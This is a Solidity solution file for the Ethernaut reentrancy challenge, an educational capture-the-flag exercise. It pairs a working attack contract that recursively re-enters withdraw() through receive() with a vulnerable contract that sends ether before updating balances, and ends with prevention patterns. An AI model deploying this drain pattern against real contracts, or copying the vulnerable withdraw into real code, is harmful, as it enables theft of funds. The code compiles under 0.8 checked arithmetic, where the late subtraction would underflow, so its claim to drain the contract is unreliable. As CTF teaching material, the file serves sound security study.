// Ethernaut Challenge #10: Reentrancy
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
 * REENTRANCY CHALLENGE — THE DAO HACK ($60M stolen)
 * 
 * Goal: Drain all funds from the Reentrance contract.
 * 
 * THE VULNERABILITY (Classic Reentrancy):
 * External call happens BEFORE balance is updated.
 * Attacker re-enters the function while their balance is still "valid".
 * 
 * ATTACK FLOW:
 * 1. Attacker deposits 1 ETH
 * 2. Attacker calls withdraw()
 * 3. Contract sends ETH via low-level call (external call)
 * 4. Attacker's receive() is triggered
 * 5. Attacker calls withdraw() AGAIN (re-enter)
 * 6. Balance hasn't been updated yet! Still shows original deposit
 * 7. Repeat until contract is drained
 * 8. Original balance update finally happens (too late)
 */

contract ReentrancyExploit {
    Reentrance public target;
    uint public amount;
    
    constructor(address _target) {
        target = Reentrance(_target);
    }
    
    function attack() external payable {
        require(msg.value > 0, "Send ETH");
        amount = msg.value;
        
        // Step 1: Deposit
        target.donate{value: msg.value}(address(this));
        
        // Step 2: Trigger withdraw (which triggers reentrancy)
        target.withdraw(msg.value);
    }
    
    // This is called when contract receives ETH
    receive() external payable {
        uint targetBalance = address(target).balance;
        
        // Keep withdrawing while target has funds
        if (targetBalance >= amount) {
            target.withdraw(amount); // RE-ENTER!
        }
        // If target balance < amount, withdraw remaining
        else if (targetBalance > 0) {
            target.withdraw(targetBalance);
        }
    }
    
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

// Vulnerable contract (simplified from The DAO)
contract Reentrance {
    mapping(address => uint) public balances;
    
    function donate(address _to) public payable {
        balances[_to] += msg.value;
    }
    
    function balanceOf(address _who) public view returns (uint) {
        return balances[_who];
    }
    
    function withdraw(uint _amount) public {
        if(balances[msg.sender] >= _amount) {
            // VULNERABILITY: External call BEFORE state update!
            (bool result,) = msg.sender.call{value:_amount}(""); // ← REENTRY POINT
            if(result) {
                _amount;
            }
            balances[msg.sender] -= _amount; // ← Updated too late!
        }
    }
    
    receive() external payable {}
}

/*
 * PREVENTION PATTERNS:
 * 
 * 1. Checks-Effects-Interactions (CEI):
 *    function withdraw(uint _amount) public {
 *        require(balances[msg.sender] >= _amount); // CHECKS
 *        balances[msg.sender] -= _amount;           // EFFECTS (update first!)
 *        msg.sender.call{value:_amount}("");       // INTERACTIONS (last)
 *    }
 * 
 * 2. Reentrancy Guard:
 *    bool private locked;
 *    modifier nonReentrant() {
 *        require(!locked, "Reentrancy");
 *        locked = true;
 *        _;
 *        locked = false;
 *    }
 * 
 * 3. Pull Over Push:
 *    Don't send ETH - let users withdraw via separate function.
 */
